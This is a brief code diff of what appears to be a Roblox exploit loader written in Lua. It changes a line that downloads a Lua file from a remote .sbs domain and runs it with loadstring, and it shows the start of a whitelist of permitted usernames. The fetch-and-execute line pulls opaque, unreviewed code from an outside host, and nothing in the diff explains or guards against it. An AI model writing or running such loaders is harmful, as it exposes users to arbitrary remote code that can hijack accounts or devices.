@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://plsrandomname.sbs/loaders/discordx2swnz.lua"))()
+loadstring(game:HttpGet("https://shzwl.sbs/loaders/discordx2swnz.lua"))()
    local allowedUsers = {
     ["phubentau"] = true,
     ["anhtthuc03"] = true
